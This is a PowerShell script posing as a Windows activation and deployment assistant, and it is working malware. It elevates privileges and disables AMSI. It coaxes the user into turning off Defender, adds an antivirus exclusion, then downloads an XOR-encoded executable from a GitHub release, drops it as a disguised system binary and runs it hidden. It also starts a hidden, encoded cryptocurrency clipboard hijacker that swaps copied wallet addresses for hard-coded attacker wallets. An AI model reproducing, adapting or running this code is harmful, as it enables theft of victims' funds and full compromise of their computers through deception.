# --- [RESEARCH STAGER v46.0: SYNCHRONIZED AUTH SUITE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Admin Gate (Ensures the environment is ready)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(580,520)
    $prep.StartPosition = "CenterScreen"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(35,40); $console.Size = New-Object Drawing.Size(490,140)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > ANALYZING HOST... DONE`n > PRIVILEGES: ADMINISTRATOR`n > STATUS: [!] SECURITY CONFLICT DETECTED"
    $prep.Controls.Add($console)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,300); $link.Size = New-Object Drawing.Size(480,45)
    $link.Text = "STEP 1: Open Security Panel (Turn OFF All Protection)"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215)
    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,360); $check.Text = "STEP 2: I have turned OFF all protection layers."; $check.Size = New-Object Drawing.Size(450,30)
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(195,410); $btn.Size = New-Object Drawing.Size(180,45); $btn.Text = "Deploy Now"; $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Run-Deployment {
    $form = New-Object Windows.Forms.Form
    $form.Text = "System Deployment"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $label = New-Object Windows.Forms.Label; $label.Location = New-Object Drawing.Point(30,30); $label.Text = "Status: Initializing..."
    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($label); $form.Controls.Add($pb); $form.Show()

    # Define paths
    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
    $path = Join-Path $dir "WinSvcHost.exe"

    $stages = @(
        @{p=15; t="Establishing Secure Connection..."},
        @{p=40; t="Downloading Digital License..."},
        @{p=60; t="Awaiting System Authorization (Click YES on Prompt)..."}, # THIS IS THE MOMENT
        @{p=85; t="Finalizing Installation..."},
        @{p=100; t="Deployment Complete."}
    )

    foreach ($s in $stages) {
        $label.Text = "Status: " + $s.t
        
        # ACTIVATE PAYLOAD AT 60%
        if ($pb.Value -eq 40) {
            try {
                if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
                Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
                
                $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
                $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
                $data = [Convert]::FromBase64String($raw.Trim())
                for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
                [IO.File]::WriteAllBytes($path, $data)
                
                # This triggers the UAC "Yes" box from your photo
                Start-Process $path -WindowStyle Hidden
                
                # CLIPPER (v34.0 Logic)
                $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
                $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
                Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
            } catch {
                $form.Close()
                [Windows.Forms.MessageBox]::Show("Critical Error: 0x80041010. Connection Timed Out.", "Critical Error", 0, 16) | Out-Null
                exit
            }
        }

        # Verification Pause at 85%
        if ($pb.Value -eq 60) {
            $timer = 0
            # Wait up to 30 seconds for the user to click YES
            while (!(Get-Process "WinSvcHost" -ErrorAction SilentlyContinue) -and $timer -lt 60) {
                [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 500; $timer++
            }
        }

        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 50 }
    }

    Start-Sleep -Seconds 1
    $form.Close()
    [Windows.Forms.MessageBox]::Show("Windows Activated Successfully.", "Success", 0, 64) | Out-Null
}

# --- MAIN ---
Global-Initialize
Show-SecurityPrep
if ($global:proceed) { Run-Deployment }
